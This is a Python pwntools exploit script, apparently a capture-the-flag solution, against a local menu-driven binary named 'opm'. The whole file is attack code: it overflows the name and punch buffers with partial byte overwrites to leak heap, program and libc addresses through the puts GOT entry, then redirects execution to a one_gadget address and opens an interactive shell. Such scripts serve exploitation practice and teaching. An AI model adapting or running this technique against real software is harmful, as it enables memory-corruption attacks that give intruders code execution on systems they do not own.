#coding:utf-8
from pwn import *
import os

context.arch ='amd64'
#context.log_level='debug'

io = process('./opm_fu2jhuid901283yruhnuy892')
elf = ELF('./opm_fu2jhuid901283yruhnuy892')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def mmenu(mchoice):
    io.recvuntil("(E)xit\n")
    io.sendline(mchoice)

def newrole(mname, punch):
    mmenu('A')
    io.recvuntil("Your name:\n")
    io.sendline(mname)
    io.recvuntil("N punch?\n")
    io.sendline(punch)

def show():
    mmenu('S')

if __name__ =='__main__':
    pause()
    newrole('a'*0x60,str(250))
    newrole('b'*0x80+'\x40',str(250))
    newrole('c'*0x80,str(250).ljust(0x80,'c')+'\x40')
    io.recv(0x18+1)
    heap = u64(io.recv(6).ljust(8,'\x00'))-0x1b0
    io.recvuntil('\n')
    print hex(heap)
    pause()
    newrole('1'*0x30,str(heap+0x20).ljust(0x80,'a')+'\x30')
    pause()
    newrole('2'*0x30,'b'*0x80+'\x40')
    io.recv(1)
    code = u64(io.recv(6).ljust(8,'\x00'))-0xb30
    print hex(code)
    puts_got = code+elf.got['puts']
    print hex(puts_got)
    #libc_base = puts_got-libc.symbols['puts']
    pause()
    newrole('3'*0x30,str(puts_got).ljust(0x80,'a')+'\x30')
    newrole('4'*0x30,'b'*0x80+'\x40')
    io.recv(1)
    libc_base = u64(io.recv(6).ljust(8,'\x00'))-libc.symbols['puts']
    print hex(libc_base)
    pause()    
    one_shot = libc_base+0x4526a
    newrole(p64(one_shot),'a'*0x80+p64(heap+0x430))
    pause()
    show()
    pause()
    io.interactive()
